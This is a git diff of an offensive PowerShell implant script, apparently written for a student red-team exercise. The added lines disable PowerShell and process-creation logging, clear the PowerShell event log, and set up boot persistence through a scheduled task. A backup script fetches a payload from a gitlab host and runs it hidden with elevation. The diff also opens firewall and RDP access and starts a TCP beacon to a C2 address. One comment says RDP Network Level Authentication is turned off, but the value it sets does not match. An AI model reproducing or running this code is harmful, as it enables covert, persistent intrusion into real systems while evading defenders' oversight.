@@ -24,6 +24,14 @@ function Convert-ROT13 {
     return $OutputString
 }
 
+# Get rid of PowerShell Logging
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f | Out-Null
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f | Out-Null
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f | Out-Null
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f | Out-Null
+
+Clear-EventLog -LogName "Windows PowerShell"
+
 # Create scheduled task for this payload to run on boot
 $action = New-ScheduledTaskAction -Execute "C:\Windows\fonts\Javalanche.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -38,8 +46,8 @@ if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
 if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
     New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
     $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
-    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/Javalanche.ps1`""
-    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -Verb RunAs}"
+    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`";"
+    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -WindowStyle Hidden -Verb RunAs"
     $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
 }
 
@@ -50,11 +58,11 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImport
 
 # Set up Firewall rules to make sure the C2 can communicate with the client
 netsh adv f a r n="WinRM Default Rule" dir=in act=allow prof=any prot=tcp localport=5985,5986
-netsh adv f a r n="WinRM C2 Rule" dir=in act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=5985,5986
 netsh adv f a r n="HTTP Default Rule" dir=out act=allow prof=any prot=tcp remoteport=80,443
-netsh adv f a r n="HTTP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress remoteport=80
 netsh adv f a r n="RDP Default Rule" dir=in act=allow prof=any prot=tcp localport=3389
-netsh adv f a r n="RDP C2 Rule" dir=out act=allow prof=any prot=tcp remoteip=$beaconIPAddress localport=3389
+
+# Turn off RDP Network Level Authentication
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f | Out-Null
 
 # Set up TCP connection to the server
 $tcpConnection = New-Object System.Net.Sockets.TcpClient($beaconIPAddress, 80)
